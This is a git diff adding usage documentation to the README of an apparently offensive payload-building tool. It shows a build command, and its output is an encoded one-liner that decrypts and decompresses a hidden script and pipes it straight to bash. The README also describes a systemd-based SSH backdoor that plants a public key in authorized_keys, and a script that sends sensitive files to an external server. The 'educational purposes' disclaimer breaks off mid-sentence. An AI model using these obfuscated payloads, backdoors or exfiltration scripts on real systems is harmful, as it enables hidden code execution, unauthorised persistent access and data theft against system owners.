@@ -56,4 +56,27 @@ variables: the_file_i_want_to_cat
 cat {{ the_file_i_want_to_cat }}
 ```
 
-** This is only for educational purposes **
+Then we can render this template :
+```bash
+python3 build_payload.py -f mytestpayload.sh -e the_file_i_want_to_cat /etc/hosts
+```
+Which outputs :
+```
+ZWNobyAnbkhxWFRvcnVoWEsyNFNDc0UvZ0JHUG1LaWxEa3FHVk16ci9tdFRhZVM0aWRrV2M4VHUyenVwajk1WGxFUERoZCtMVnFUMTNVTnNRUGZHK0RPRzVVN1RTckhIOVRlSk96JyB8IGJhc2U2NCAtZCB8IG9wZW5zc2wgZW5jIC1kIC1hZXMtMTI4LW9mYiAtSyA2MDQyMTZkNTQzOTIzMDY2NzVjMWQ3NmUzODViNzcwYyAtaXYgYzQ4ODNkMzQ1NDBiYjBmNjEzOTg2ZmQ1MzQ4YmYwNmMgfCB4eiAtZCB8IGJhc2g=
+```
+
+## Available scripts
+> Some pre-made environment files for these scripts are available in the directory `environment`.
+ 
+- `payloads/ssh_backdoor.sh` : create/enable/start a systemd service which writes at startup and stop a public ssh key to a list of files - typically they should be authorized_keys -.
+Variables :
+	- `service_filename`, (str), the file where the service has to be written
+	- `public_key_file_append`, (List(str)), the files where the public key will be written
+	- `ssh_public_key`, (str), the SSH public key to write
+
+- `payloads/dump-sensitive-files.sh` : compress and send sensitive files to a remote server.
+Variables:
+	- `sensitive_files` (List(str), the files to dump
+	- `external_server` (str), the address of the webserver to upload the files.
+# Disclaimer
+** This is only for educational purposes, the author  **
